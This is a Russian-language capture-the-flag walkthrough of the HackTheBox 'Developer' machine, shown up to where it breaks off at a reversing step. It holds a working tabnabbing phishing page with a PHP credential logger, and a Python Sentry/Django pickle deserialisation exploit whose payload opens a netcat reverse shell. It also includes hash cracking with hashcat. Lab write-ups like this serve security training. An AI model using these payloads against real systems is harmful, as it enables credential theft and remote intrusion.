---
hidden: true
---

# Прохождение Hackthebox::Developer

<figure><img src="../../../.gitbook/assets/image (187).png" alt=""><figcaption></figcaption></figure>

## Тэги:

* Linux
* Reversing
* Phishing(Tabnabbing)
* Python
* Deserialisation
* Weak Password
* Cryptography

## Содержание:

В самом начале у нас будет два порта - 22 и 80. На 80 есть CTF-платформа. Далее, мы можем пройти один из тасков, чтобы продвинуться далее в захвате машины.

## Сканируем порты с помощью nmap

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 36:aa:93:e4:a4:56:ab:39:86:66:bf:3e:09:fa:eb:e0 (RSA)
|   256 11:fb:e9:89:2e:4b:66:40:7b:6b:01:cf:f2:f2:ee:ef (ECDSA)
|_  256 77:56:93:6e:5f:ea:e2:ad:b0:2e:cf:23:9d:66:ed:12 (ED25519)
80/tcp open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://developer.htb/
Service Info: Host: developer.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Добавляем developer.htb в /etc/hosts, идем на 80 порт и регистрируемся на http://developer.htb/accounts/signup/.

## Решаем простейший таск - Forensic/Phished List

<figure><img src="../../../.gitbook/assets/image (188).png" alt=""><figcaption></figcaption></figure>

```
$ wget http://developer.htb/media/phished_list.zip
$ unzip phished_list.zip
```

Итак, из архива у нас есть таблица, которую можно посмотреть. У нас есть 5 столбцов - A,B,C,D,F. Вопрос: а где столбец E? Редактировать таблицу мы не можем, так как она защищена паролем, а нам нужно просто снять защиту. "Распаковываем" таблицу:

<figure><img src="../../../.gitbook/assets/image (189).png" alt=""><figcaption></figcaption></figure>

Лазая по директориям и смотря файлы, можно обнаружить флаг в открытом виде:

<figure><img src="../../../.gitbook/assets/image (190).png" alt=""><figcaption></figcaption></figure>

Но это слишком легкий путь, все-таки была задача снять защиту. Перебирая разные ключевые слова через grep мы можем найти интересный вывод:

```
$ grep -iR hash .
```

```
./xl/worksheets/sheet1.xml:
(...)
<sheetProtection algorithmName="SHA-512" hashValue="Y4Ko7kZUKStIxaVGWEtuMeRdnCiN7O3D8qZtKdo/2jP7WE6yzKQXUcSWQ/E0OrqHCzhOBFX+t8Db5Pxaiu+N1g==" saltValue="EoiHQklf0FagPs+iW0OzkA==" spinCount="100000" sheet="1" objects="1" scenarios="1"/>
(...)
```

Соответственно эту строку и нужно удалить, чтобы убрать защиту таблицы паролем. Удаляем и запаковываем все обратно:

```
$ zip -r credentials.xlsx .
```

Теперь мы можем посмотреть столбец E и получить флаг, который нужно ввести в таске:&#x20;

<figure><img src="../../../.gitbook/assets/image (191).png" alt=""><figcaption></figcaption></figure>

## Суть фишинг атаки Tab Nabbing

После того, как мы ввели флаг, мы имеем возможность предложить свое решение, а именно вставить URL на свой сайт:

<figure><img src="../../../.gitbook/assets/image (192).png" alt=""><figcaption></figcaption></figure>

Конечно, можно попытаться провести SSRF, но не очень понятно для чего, так как других поддоменов пока что нету и панелей админов тоже. Поэтому лучше проверить действительно ли кто-то проверяет райтапы, которые мы высылаем:

<figure><img src="../../../.gitbook/assets/image (193).png" alt=""><figcaption></figcaption></figure>

И админ действительно заходит по ссылке и смотрит что у нас там:

<figure><img src="../../../.gitbook/assets/image (194).png" alt=""><figcaption></figcaption></figure>

Админ использует Firefox версии 75.0. Насколько я знаю, версия тут не важна, смысл в том, что Chrome, Opera и некоторые другие браузеры блокируют попытки фишинговой атаки Tab Nabbing, но не Firefox. К слову, чтобы распознать Tab Nabbing нужно также посмотреть исходный код страницы, где публикуется ваш райтап. Если мы перейдем в профиль(http://developer.htb/profile), то сможем увидеть вкладку "Published Walkthroughs". В ней публикуются ссылки на наши райтапы.

<figure><img src="../../../.gitbook/assets/image (195).png" alt=""><figcaption></figcaption></figure>

Самый главный индикатор для Tab Nabbing - это в тэге ссылки аттрибут target="\_blank", т.е. который открывает новую вкладку:

<figure><img src="../../../.gitbook/assets/image (196).png" alt=""><figcaption></figcaption></figure>

Суть Tab Nabbing'а заключается в том, что при переходе на наш сайт и страницу index.html мы имеем доступ к прошлой странице через js. То есть, если мы напишем специальный js-код и жертва перейдет по ссылке, то попадет на наш сайт, а старая страница, из которой он перешел по ссылке заредиректится на нашу специальную ссылку => мы можем сделать копию страницы(например, авторизации) с оригинального сайта, но разместить на нашем и тем самым невнимательная жертва, когда перейдет обратно на старую вкладку, увидит окно авторизации, и если этот человек совсем не знаком с основами ИБ, то он ничего не заподозрит и авторизуется, а мы получим его данные.

## Используем Tab Nabbing для кражи учетных данных админа

Перейдем к действиям. Для этого, мы рекурсивно скачиваем страницу авторизации с http://developer.htb:

```
$ wget -r http://developer.htb/accounts/login/
```

Создаем index.html в папке developer.htb и вписываем в него:

```html
<script>
    if (window.opener) window.opener.parent.location.replace('http://10.10.16.43/accounts/login/');
    if (window.parent != window) window.parent.location.replace('https://10.10.16.43/accounts/login/');           
</script>
```

Далее переходим в accounts/login и меняем index.html на index.php:

```
$ mv index.html index.php
```

Редактируем index.php и в конце дописываем следующий php-код:

```php
<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    file_put_contents(creds.txt, $_POST['login'] . ":" . $_POST['password']);
}

?>
```

Затем переходим в корень(в папку developer.htb) нашего фишинг сайта и запускаем это все:

```
$ sudo php -S 10.10.16.43:80
```

Далее опять отправляем райтап и ждем, потом мы увидим, что админ зашел все-таки на наш сайт и, вернувшись на старую страницу, не увидел, что домен 10.10.16.43 и авторизовался:

<figure><img src="../../../.gitbook/assets/image (197).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (198).png" alt=""><figcaption></figcaption></figure>

```
admin:SuperSecurePassword@HTB2021
```

Эти данные подойдут для авторизации под админом.

Можем зайти на http://developer.htb/admin/ - это дефолтная админка django:

<figure><img src="../../../.gitbook/assets/image (199).png" alt=""><figcaption></figcaption></figure>

Во вкладке "Sites" есть поддомен:

<figure><img src="../../../.gitbook/assets/image (200).png" alt=""><figcaption></figcaption></figure>

Добавляем его в /etc/hosts и видим на нем вкладку авторизации:

<figure><img src="../../../.gitbook/assets/image (201).png" alt=""><figcaption></figcaption></figure>

В Sentry мы можем воспользоваться функцией потери пароля, при этом можно узнать существует ли такая почта или нет:

<figure><img src="../../../.gitbook/assets/image (202).png" alt=""><figcaption></figcaption></figure>

Перебирая почты из вкладки "Users" ничего не подошло, но есть пользователь Jacob и мы можем попробовать сделать из его имени почту:

<figure><img src="../../../.gitbook/assets/image (203).png" alt=""><figcaption></figcaption></figure>

```
jacob@developer.htb
```

<figure><img src="../../../.gitbook/assets/image (204).png" alt=""><figcaption></figcaption></figure>

Так как пароля нам не дали, можно попробовать старый пароль и он подойдет:

```
jacob@developer.htb:SuperSecurePassword@HTB2021
```

Есть [вот такая статья](https://blog.scrt.ch/2018/08/24/remote-code-execution-on-a-facebook-server/) об RCE уязвимости в Sentry. Главное, что нужно из нее узнать, так это то, что при создании проекта, а потом его удалении мы можем обнаружить:

```
'system.secret-key': 'c7f3a64aa184b7cbb1a7cbe9cd544913'
```

<figure><img src="../../../.gitbook/assets/image (205).png" alt=""><figcaption></figcaption></figure>

Вот нужный нам эксплоит:

```python
#!/usr/bin/python
import django.core.signing, django.contrib.sessions.serializers
from django.http import HttpResponse
import cPickle
import os

SECRET_KEY='c7f3a64aa184b7cbb1a7cbe9cd544913'
#Initial cookie I had on sentry when trying to reset a password
cookie='.eJxrYKotZNQI5UxMLsksS80vSi9kimBjYGAoTs0rKaosZA5lKS5NyY_gAQq5GhmHR5Y5G7uH5JdEcAEFSlKLS5Lz87MzU8FayvOLslNTQnnjE0tLMuJLi1OL4jNTvFlDhZAEkhKTs1PzUkKVIObrlZZk5hTrgeT1XHMTM3McgSwniJpSPQC8QjOA:1nEwF5:5-mSN7bcB3zSztnqFAiW0KBGjVw'
newContent =  django.core.signing.loads(cookie,key=SECRET_KEY,serializer=django.contrib.sessions.serializers.PickleSerializer,salt='django.contrib.sessions.backends.signed_cookies')
class PickleRce(object):
    def __reduce__(self):
        return (os.system,("rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.43 9898 >/tmp/f",))
newContent['testcookie'] = PickleRce()

print django.core.signing.dumps(newContent,key=SECRET_KEY,serializer=django.contrib.sessions.serializers.PickleSerializer,salt='django.contrib.sessions.backends.signed_cookies',compress=True)
```

В нем нужно указать SECRET\_KEY, который нужно найти на странице ошибки удаления проекта, а также наши куки.

Также, если вы используете Parrot OS, то нужно установить django для python2, а для python2 - pip2. Делается это так:

```
$ wget https://bootstrap.pypa.io/pip/2.7/get-pip.py
$ sudo python2 get-pip.py
$ pip2 install django
```

Запускаем эксплоит, нам выдадут куки, их нужно будет вставить в браузер на сайте и обновить страницу и мы получим шелл:

<figure><img src="../../../.gitbook/assets/image (206).png" alt=""><figcaption></figcaption></figure>

Ищем конфиг sentry в /etc/sentry и получаем следующую информацию:

```
(...)
DATABASES = {
    'default': {
        'ENGINE': 'sentry.db.postgres',
        'NAME': 'sentry',
        'USER': 'sentry',
        'PASSWORD': 'SentryPassword2021',
        'HOST': 'localhost',
        'PORT': '',
    }
}
(...)
```

И вытаскиваем данные из БД:

<figure><img src="../../../.gitbook/assets/image (207).png" alt=""><figcaption></figcaption></figure>

```
karl@developer.htb  | pbkdf2_sha256$12000$wP0L4ePlxSjD$TTeyAB7uJ9uQprnr+mgRb8ZL8othIs32aGmqahx1rGI=

jacob@developer.htb | pbkdf2_sha256$12000$MqrMlEjmKEQD$MeYgWqZffc6tBixWGwXX2NTf/0jIG42ofI+W3vcUKts=
```

Jacob нам не нужен, так как его нету в папке home и мы под его именем входили на сайт.

Поэтому берем хэш карла и брутим с помощью hashcat:

```
$ hashcat -m 10000 karl_hash /usr/share/wordlists/rockyou.txt --force
```

```
pbkdf2_sha256$12000$wP0L4ePlxSjD$TTeyAB7uJ9uQprnr+mgRb8ZL8othIs32aGmqahx1rGI=:insaneclownposse
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Django (PBKDF2-SHA256)
Hash.Target......: pbkdf2_sha256$12000$wP0L4ePlxSjD$TTeyAB7uJ9uQprnr+m...x1rGI=
Time.Started.....: Tue Feb  1 17:29:15 2022, (36 secs)
Time.Estimated...: Tue Feb  1 17:29:51 2022, (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     1718 H/s (7.19ms) @ Accel:512 Loops:64 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 61440/14344385 (0.43%)
Rejected.........: 0/61440 (0.00%)
Restore.Point....: 58368/14344385 (0.41%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:11968-11999
Candidates.#1....: kruimel -> sinead1
```

Соответственно данные для карла:

```
karl:insaneclownposse
```

Подключаемся по ssh и можем прочитать user.txt:

<figure><img src="../../../.gitbook/assets/image (208).png" alt=""><figcaption></figcaption></figure>

```
$ sudo -l
```

```
[sudo] password for karl: 
Matching Defaults entries for karl on developer:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User karl may run the following commands on developer:
    (ALL : ALL) /root/.auth/authenticator
```

От имени рута нам можно запускать /root/.auth/authenticator. Командой file мы можем проверить, что это 64-битный ELF файл, значит мы теперь имеем дело в реверсом. Качаем [гидру](https://github.com/NationalSecurityAgency/ghidra), а также отправляем файл authenticator на наш хост.



<продолжение>

